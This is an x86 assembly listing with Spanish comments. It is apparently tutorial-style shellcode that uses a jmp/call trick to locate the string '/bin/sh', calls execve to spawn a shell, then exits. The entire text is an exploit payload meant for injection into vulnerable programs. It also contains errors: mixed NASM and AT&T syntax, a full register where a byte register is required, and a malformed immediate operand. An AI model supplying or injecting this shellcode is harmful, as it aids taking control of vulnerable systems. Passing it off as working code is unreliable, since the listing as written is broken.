section .text
global _start
_start:
jmp	0x1f		; Salto al ultimo call
popl	%esi		; Obtenemos en ESI: "/bin/sh"
movl	%esi,0x8(%esi)	; Concatenera: "/bin/sh_&(/bin/sh)
xorl	%eax, %eax	; '\0' al final: "/bin/sh\0&(/bin/sh)
movb	%eax, 0x7(%esi)	; Agregar NULL: "/bin/sh\0&(/bin/sh)NULL
movl	%eax, 0xc(%esi)	; Syscall 11 --------------------
movb	%0xb, %al	; arg1 = "/bin/sh"
movl	%esi, %ebx
leal	0x8(%esi),%ecx	; arg2[2] = {"/bin/sh","0"}
leal	0xc(%esi),%edx	; arg3 = NULL
int	$0x80		; execve("/bin/sh",["/bin/sh",NULL],NULL) <-O
xorl	%ebx,%ebx	; Syscall 1 --
movl	%ebx, %eax	; arg1=0
int 	$0x80		; exit(0)
call	-0x24		; Salto a la primera instruccion
.string	\"/bin/sh\"	; Nuestra cadena
